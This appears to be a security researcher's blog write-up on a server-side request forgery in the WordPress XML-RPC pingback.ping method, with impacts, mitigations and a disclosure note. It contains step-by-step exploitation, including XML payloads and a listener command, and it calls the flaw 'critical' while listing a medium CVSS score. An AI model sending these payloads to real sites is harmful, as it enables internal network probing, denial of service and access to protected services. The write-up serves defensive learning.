# XML-RPC Server-Side Request Forgery: How I Discovered a Critical WordPress Vulnerability

My mentor taught me about various WordPress-related vulnerabilities.

That knowledge was the foundation. But then I started exploring deeper. Asking "what else can this do?"

That's when I found it.

A critical Server-Side Request Forgery (SSRF) vulnerability that most WordPress administrators don't even know exists.

Here's the story.

## What is XML-RPC?

XML-RPC is a WordPress feature. It's been around for years. It's built into WordPress core. It allows external applications to communicate with your WordPress site and do things like publish posts, manage comments, upload files, etc.

The problem? Most sites don't use it anymore. But they have it enabled by default.

And that's where the vulnerability lives.

## What I Found

The vulnerability exists in a specific XML-RPC method called `pingback.ping`.

This method is supposed to work like this: Blog A links to Blog B, so Blog B gets notified. Blog B makes a request to Blog A to verify that the link actually exists.

Simple, right?

But here's the problem: The server doesn't properly validate **where** it makes these requests to.

So instead of making a request to a legitimate blog, an attacker can trick it into making a request to **literally anywhere**.

To an internal service. To an internal database. To an internal admin panel. To an IP address on the private network. Anywhere.

The server becomes a proxy. It does whatever the attacker tells it to do.

## Why This Is Critical

Let me break down what an attacker can do with this:

**Denial of Service (DoS):**
An attacker can make the server send massive amounts of traffic to a target — either an internal service or an external website. The server essentially becomes a weapon. It floods the victim with traffic.

**Internal Network Discovery:**
An attacker can map out what services exist on the internal network. "Is there a database running on port 5432? Is there an admin panel on port 8080? What services are running locally?" The attacker can discover all of this without directly attacking anything.

**Access to Hidden Services:**
The server can reach internal services that are protected by firewalls and shouldn't be accessible from the internet. The attacker can access them through the WordPress server as a middleman.

**Chaining with Other Vulnerabilities:**
By itself, SSRF is serious. But when combined with other vulnerabilities in internal services, it becomes catastrophic. Full server compromise. Complete network breach.

All of this happens **without any authentication**. Anyone can do it. You don't need a WordPress account. You don't need any credentials. Just access to that `/xmlrpc.php` file.

## How I Found It

I learned about XML-RPC's basic attack vectors from my mentor. That knowledge gave me a foundation. But then I started thinking: "What if there's more? What if this endpoint can do something even more dangerous?"

I started testing. Exploring. Asking dumb questions.

And that's when I found the SSRF vulnerability.

My mentor's guidance opened the door. But the discovery? That came from curiosity and willingness to explore beyond what I was taught.

## Step-by-Step: How the Attack Works

Here's how simple it is to exploit this:

**Step 1: Check if XML-RPC is enabled**

Visit the WordPress site and go to `/xmlrpc.php`

If you see: "XML-RPC server accepts POST requests only" — it's enabled.

<img width="1443" height="720" alt="1" src="https://github.com/user-attachments/assets/6de01c52-96b3-4a73-b18e-948a52dfb408" />
<img width="1549" height="597" alt="2" src="https://github.com/user-attachments/assets/e7851baa-df9f-41dd-8502-1e1d2fc4fe34" />


**Step 2: List all available methods**

Send a POST request with this XML:

```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

The response shows all methods the server supports. Look for `pingback.ping`.

<img width="1333" height="652" alt="3" src="https://github.com/user-attachments/assets/1338e950-3463-4ffc-a935-038e0e200676" />


**Step 3: Set up a server to receive the request**

Start a simple web server on your machine:

```bash
python3 -m http.server 8000
```

This is so you can see when the target server makes a request to your server (proving the SSRF works).

**Step 4: Send the malicious pingback request**

Send a POST request with this XML payload:

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://YOUR_SERVER:PORT</string></value>
</param>
<param>
<value><string>http://TARGET_SITE.com/any-post/</string></value>
</param>
</params>
</methodCall>
```

Replace:
- `YOUR_SERVER:PORT` with your server URL
- `TARGET_SITE.com/any-post/` with any valid post from the WordPress site

<img width="1457" height="642" alt="4" src="https://github.com/user-attachments/assets/e28823d4-d66f-4fcf-bd53-dc2db97c3ffc" />


**Step 5: Check your server logs**

If the SSRF works, your server will receive a request from the target server. You'll see it in your logs.

That proves it. The server made a request to your arbitrary URL. Unauthenticated. Unprotected.

<img width="1668" height="606" alt="5" src="https://github.com/user-attachments/assets/c9348faa-5907-443e-8c6d-d3b74d40d8ff" />


Now imagine instead of your test server, that request goes to:
- An internal database
- A local admin panel
- A service that shouldn't be accessible
- A metadata service holding sensitive credentials

That's the real danger.

## The Technical Details

**Vulnerability Type:** Server-Side Request Forgery (SSRF) via XML-RPC

**Vulnerable Method:** pingback.ping

**Authentication Required:** None

**How to Exploit:** Send a specially crafted XML payload to the `/xmlrpc.php` endpoint

**Root Cause:** Insufficient input validation on URLs passed to the pingback.ping method. The server doesn't check WHERE it's making requests to — it just makes them.

**CVSS Score:** 5.3 (Medium)

**CWE:** CWE-918: Server-Side Request Forgery

## What Should Be Done

**The Best Fix: Disable XML-RPC**

Most WordPress sites don't use XML-RPC anymore. Just disable it. Use a WordPress security plugin or ask your hosting provider to turn it off. Done.

**If You Must Keep It: Disable pingback.ping**

If you absolutely need XML-RPC for some reason, at least disable the pingback method. Most security plugins have a one-click option for this.

**Block It at the Firewall**

Don't let anyone access `/xmlrpc.php` from the internet. Block it at your firewall level or use a security plugin to restrict access.

**Use Modern APIs**

WordPress has moved away from XML-RPC. If you're building new integrations, use the modern REST API instead. It's more secure.

**Control Outbound Requests**

Make sure your web server can only make requests to approved services. Don't let it make requests to random internal IPs or unknown servers.

## What I Learned

This whole experience taught me something important: The most dangerous vulnerabilities are often hiding in features that have been around forever.

Everyone knows XML-RPC exists. It's a built-in WordPress feature. But because it's "official" and "old," people assume it's secure. Nobody tests it. Nobody thinks about it.

That assumption is the vulnerability.

My mentor taught me the foundation. But the real learning came from curiosity. From asking "what if?" From exploring beyond what I was taught.

If you're getting into security research, this is the mindset you need: Don't trust defaults. Test everything. Be curious. Ask dumb questions.

The internet is full of WordPress sites with XML-RPC enabled and completely unpatched. The vulnerabilities are there. You just have to look for them.

---

## Connect With Me

If this interested you, check out more of my journey:

- **YouTube:** [https://youtube.com/@akashmadanu3994](https://youtube.com/@akashmadanu3994)
  Learn more about cybersecurity discoveries and ethical hacking.

- **LinkedIn:** [https://www.linkedin.com/in/akash-madanu/](https://www.linkedin.com/in/akash-madanu/)
  Follow my professional journey and insights.

- **Instagram:** [https://www.instagram.com/cyb3rwithakash/](https://www.instagram.com/cyb3rwithakash/)
  Daily cybersecurity content and updates.

---

*This vulnerability was reported through responsible disclosure. The organization has been notified and is actively working on mitigation. This writeup is shared to help other researchers and WordPress administrators understand the critical importance of properly securing XML-RPC endpoints.*
